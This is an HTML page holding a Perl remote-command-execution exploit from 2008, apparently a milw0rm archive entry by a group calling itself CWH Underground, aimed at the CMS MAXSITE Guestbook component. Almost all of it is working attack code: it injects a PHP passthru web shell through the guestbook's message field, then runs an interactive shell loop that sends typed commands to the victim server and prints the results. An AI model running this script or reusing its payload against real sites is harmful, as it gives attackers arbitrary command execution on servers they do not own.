<html><head><title>CMS MAXSITE Component Guestbook Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
#==================================================================
# CMS MAXSITE Component Guestbook Remote Command Execution Exploit
#==================================================================
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 2 December 2008
#SITE : cwh.citec.us
#
#
#####################################################################
#APPLICATION : CMS MAXSITE Component Guestbook
#COMPONENT   : Guestbook
#DOWNLOAD	 : http://maxsite.geniuscyber.com/download/Ex-guestbook.rar
#####################################################################
#
#
#####################################################################
# Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos   
# Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#####################################################################

use LWP;
use HTTP::Request;

my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); }

print &quot;\n==================================================\n&quot;;
print &quot;    CMS MAXSITE Component Guestbook RCE Exploit \n&quot;;
print &quot; \n&quot;;
print &quot;         Discovered By CWH Underground \n&quot;;
print &quot;==================================================\n&quot;;
print &quot;                                              \n&quot;;
print &quot;  ,--^----------,--------,-----,-------^--,   \n&quot;;
print &quot;  | |||||||||   `--------'     |          O	\n&quot;;
print &quot;  `+---------------------------^----------|   \n&quot;;
print &quot;    `\_,-------, _________________________|   \n&quot;;
print &quot;      / XXXXXX /`|     /                      \n&quot;;
print &quot;     / XXXXXX /  `\   /                       \n&quot;;
print &quot;    / XXXXXX /\______(                        \n&quot;;
print &quot;   / XXXXXX /                                 \n&quot;;
print &quot;  / XXXXXX /   .. CWH Underground Hacking Team ..  \n&quot;;
print &quot; (________(                                   \n&quot;;
print &quot;  `------'                                    \n&quot;;
print &quot;                                              \n&quot;;

if ($#ARGV != 0)
{
   print &quot;Usage: ./xpl.pl &lt;URL to index page&gt;\n&quot;;
   print &quot;Ex. ./xpl.pl http://www.target.com/maxsite/index.php\n&quot;;
   exit();
}

$index = $ARGV[0];
$upload_url = $index.&quot;?name=guestbook&amp;file=message&quot;;

print &quot;\n[+] Trying to Inject the Code...\n&quot;;

$ua = LWP::UserAgent-&gt;new ();
$post = HTTP::Request-&gt;new (POST =&gt; $upload_url);
$post-&gt;header (User_Agent =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
$post-&gt;header (Accept =&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
$post-&gt;header (Accept_Language =&gt; 'en-us,en;q=0.5');
$post-&gt;header (Content_Type =&gt; 'application/x-www-form-urlencoded');
$post-&gt;content ('name=CWH&amp;aim=CWH&amp;email=CWH&amp;site=http%3A%2F%2Fcitec.us&amp;message=%3C%3Fphp+%0D%0Aif%28get_magic_quotes_gpc%28%29%29%0D%0A%7B+%0D%0A%09%24_GET%5Bcmd%5D%3Dstripslashes%28%24_GET%5Bcmd%5D%29%3B%0D%0A%7D+%0D%0Aecho+%28%22%23%23%25%24%24%25%23%23%22%29%3B%0D%0Apassthru%28%24_GET%5Bcmd%5D%29%3B+%0D%0Aecho+%28%22%23%23%25%24%24%25%23%23%22%29%3B%0D%0A%3F%3E&amp;submitButtonName=Submit');

$response = $ua-&gt;request ($post);

if ($response-&gt;code ne 200) {
	print &quot;\nRCE Exploit Failed\n&quot;;
	exit();
}

print &quot;\nSuccessfully Inject Code !!!\n\n&quot;;
print &quot;[cwh-shell]# &quot;;
chomp ($cmd = &lt;STDIN&gt;);

while ($cmd ne &quot;exit&quot;) {

	
	$url = $index.&quot;?name=guestbook&amp;cmd=&quot;.$cmd;

	$req = HTTP::Request-&gt;new (GET =&gt; $url);
	$req-&gt;header (User_Agent =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
	$req-&gt;header (Accept =&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
	$req-&gt;header (Accept_Language =&gt; 'en-us,en;q=0.5');

	
	$response = $ua-&gt;request ($req);
	$content = $response-&gt;content;

	if ($content !~ /\#\#%\$\$%\#\#/) {
		print (&quot;Exploit Failed\n&quot;);
		exit();
	}

	while ($content =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) {
		print $1;
	}

	print &quot;\n[cwh-shell]# &quot;;
	chomp ($cmd = &lt;STDIN&gt;);

}

# milw0rm.com [2008-12-02]</pre></html>